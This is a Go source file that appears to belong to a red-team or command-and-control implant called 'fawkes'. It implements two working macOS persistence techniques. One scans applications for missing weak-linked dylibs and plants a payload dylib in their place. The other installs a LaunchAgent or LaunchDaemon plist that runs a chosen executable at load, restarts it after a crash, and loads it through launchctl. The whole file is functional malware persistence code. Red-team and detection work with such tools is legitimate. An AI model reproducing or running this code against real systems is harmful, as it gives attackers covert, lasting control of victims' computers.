//go:build darwin

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

func persistDylibHijack(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistDylibHijackInstall(args)
	case "remove":
		return persistDylibHijackRemove(args)
	case "scan":
		return persistDylibHijackScan(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove, scan", args.Action)
	}
}

func persistDylibHijackScan(args persistArgs) structs.CommandResult {
	target := args.Path
	if target == "" {
		target = "/Applications"
	}

	var results []string
	candidates := findWeakDylibCandidates(target)

	if len(candidates) == 0 {
		return successResult(fmt.Sprintf("No dylib hijack candidates found in %s", target))
	}

	for _, c := range candidates {
		results = append(results, fmt.Sprintf("  %s → %s", c.binary, c.weakPath))
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Dylib Hijack Candidates (%d found in %s):\n\n", len(candidates), target))
	sb.WriteString(strings.Join(results, "\n"))
	sb.WriteString("\n\nUse: persist -method dylib-hijack -action install -path <payload.dylib> -name <weak_dylib_path>")
	return successResult(sb.String())
}

type dylibCandidate struct {
	binary   string
	weakPath string
}

func findWeakDylibCandidates(searchPath string) []dylibCandidate {
	var candidates []dylibCandidate

	filepath.Walk(searchPath, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if info.Mode()&0111 == 0 {
			return nil
		}
		if info.Size() < 1024 || info.Size() > 500*1024*1024 {
			return nil
		}

		out, err := safeCmd("otool", "-l", path).CombinedOutput()
		if err != nil {
			return nil
		}

		lines := strings.Split(string(out), "\n")
		inLoadWeakDylib := false
		for _, line := range lines {
			trimmed := strings.TrimSpace(line)
			if trimmed == "cmd LC_LOAD_WEAK_DYLIB" {
				inLoadWeakDylib = true
				continue
			}
			if inLoadWeakDylib && strings.HasPrefix(trimmed, "name ") {
				weakPath := strings.TrimPrefix(trimmed, "name ")
				if idx := strings.Index(weakPath, " (offset"); idx > 0 {
					weakPath = weakPath[:idx]
				}
				if _, statErr := os.Stat(weakPath); os.IsNotExist(statErr) {
					candidates = append(candidates, dylibCandidate{
						binary:   path,
						weakPath: weakPath,
					})
				}
				inLoadWeakDylib = false
				continue
			}
			if inLoadWeakDylib && strings.HasPrefix(trimmed, "cmd ") {
				inLoadWeakDylib = false
			}
		}

		if len(candidates) >= 50 {
			return filepath.SkipAll
		}
		return nil
	})

	return candidates
}

func persistDylibHijackInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (payload dylib to plant) is required")
	}
	if args.Name == "" {
		return errorResult("Error: name (target dylib path to hijack, from scan results) is required")
	}

	if _, err := os.Stat(args.Path); os.IsNotExist(err) {
		return errorf("Payload dylib not found: %s", args.Path)
	}

	targetDir := filepath.Dir(args.Name)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return errorf("Failed to create directory %s: %v", targetDir, err)
	}

	input, err := os.ReadFile(args.Path)
	if err != nil {
		return errorf("Failed to read payload dylib %s: %v", args.Path, err)
	}

	if err := os.WriteFile(args.Name, input, 0755); err != nil {
		return errorf("Failed to write dylib to %s: %v", args.Name, err)
	}
	structs.ZeroBytes(input)

	return successResult(fmt.Sprintf("Dylib hijack persistence installed:\n  Payload: %s\n  Planted at: %s\n  Trigger: host application loads the weak-linked dylib\n  Scope: executes as the application's user\n\nNote: SIP-protected paths cannot be hijacked. Gatekeeper may quarantine unsigned dylibs.\n\nRemove with: persist -method dylib-hijack -action remove -name %s",
		args.Path, args.Name, args.Name))
}

func persistDylibHijackRemove(args persistArgs) structs.CommandResult {
	target := args.Name
	if target == "" {
		return errorResult("Error: name (planted dylib path) is required")
	}

	if _, err := os.Stat(target); os.IsNotExist(err) {
		return errorf("No dylib found at %s", target)
	}

	if err := os.Remove(target); err != nil {
		return errorf("Failed to remove %s: %v", target, err)
	}

	return successResult(fmt.Sprintf("Removed planted dylib: %s", target))
}

func persistXPCService(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistXPCServiceInstall(args)
	case "remove":
		return persistXPCServiceRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistXPCServiceInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable for XPC service) is required")
	}

	name := "com.fawkes.helper"
	if args.Name != "" {
		name = args.Name
		if !strings.Contains(name, ".") {
			name = "com." + name + ".helper"
		}
	}

	home, _ := os.UserHomeDir()
	xpcDir := filepath.Join(home, "Library", "LaunchAgents")
	if os.Getuid() == 0 {
		xpcDir = "/Library/LaunchDaemons"
	}

	plistPath := filepath.Join(xpcDir, name+".plist")

	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>MachServices</key>
    <dict>
        <key>%s</key>
        <true/>
    </dict>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
</dict>
</plist>`, name, args.Path, name)

	if err := os.MkdirAll(xpcDir, 0755); err != nil {
		return errorf("Failed to create %s: %v", xpcDir, err)
	}

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return errorf("Failed to write plist %s: %v", plistPath, err)
	}

	loadCmd := safeCmd("launchctl", "load", "-w", plistPath)
	if out, err := loadCmd.CombinedOutput(); err != nil {
		return successResult(fmt.Sprintf("XPC service plist created at %s but launchctl load failed: %v\n%s\n\nThe service will load on next login/reboot.",
			plistPath, err, string(out)))
	}

	scope := "user (LaunchAgent)"
	if os.Getuid() == 0 {
		scope = "system (LaunchDaemon)"
	}

	return successResult(fmt.Sprintf("XPC service persistence installed:\n  Plist: %s\n  Label: %s\n  Executable: %s\n  MachService: %s\n  Scope: %s\n  KeepAlive: on crash (restarts automatically)\n  RunAtLoad: true\n\nRemove with: persist -method xpc-service -action remove -name %s",
		plistPath, name, args.Path, name, scope, name))
}

func persistXPCServiceRemove(args persistArgs) structs.CommandResult {
	name := "com.fawkes.helper"
	if args.Name != "" {
		name = args.Name
		if !strings.Contains(name, ".") {
			name = "com." + name + ".helper"
		}
	}

	home, _ := os.UserHomeDir()
	searchDirs := []string{
		filepath.Join(home, "Library", "LaunchAgents"),
		"/Library/LaunchDaemons",
		"/Library/LaunchAgents",
	}

	plistName := name + ".plist"
	for _, dir := range searchDirs {
		plistPath := filepath.Join(dir, plistName)
		if _, err := os.Stat(plistPath); err != nil {
			continue
		}

		safeCmd("launchctl", "unload", "-w", plistPath).Run()

		if err := os.Remove(plistPath); err != nil {
			return errorf("Failed to remove %s: %v", plistPath, err)
		}
		return successResult(fmt.Sprintf("Removed XPC service: %s (unloaded + plist deleted)", plistPath))
	}

	return errorf("No XPC service plist found for '%s'", name)
}
